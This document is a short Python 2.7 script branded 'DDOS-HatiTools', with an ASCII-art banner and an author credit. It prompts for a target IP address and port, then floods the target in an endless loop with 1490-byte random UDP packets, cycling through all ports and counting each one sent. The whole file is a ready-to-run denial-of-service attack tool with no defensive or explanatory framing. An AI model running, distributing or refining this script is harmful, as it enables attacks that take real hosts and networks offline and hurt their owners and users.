#using python2.7
#https://fb.me/arif.kun.456

import os
import sys
import socket
import random

r = '\033[91m'
g = '\033[92m'
b = '\033[94m'

z = r+'[ '+g
x = r+' ] : '+g

#SET SOCK AND RANDOM
##########################################################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) ##
bytes = random._urandom(1490)                           ##
##########################################################

os.system("clear")
print '''
                       _  _
                      ( \/ )
               .---.   \  /   .-"-.
              /   6_6   \/   / 4 4 \    [ DDOS-HatiTools ]
              \_  (__\       \_ v _/    [ Author - RHm7z ]
              //   \\\        //   \\\  [ Garuda Tersakti 72 ]
             ((     ))      ((     ))
       =======""===""========""===""=======
                |||            |||
                 |              |

'''
ip = raw_input(z+"IP Address"+x)
port = input(z+"   Port   "+x)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Send %s packet to %s success "%(sent,ip)
     if port == 65534:
       port = 1
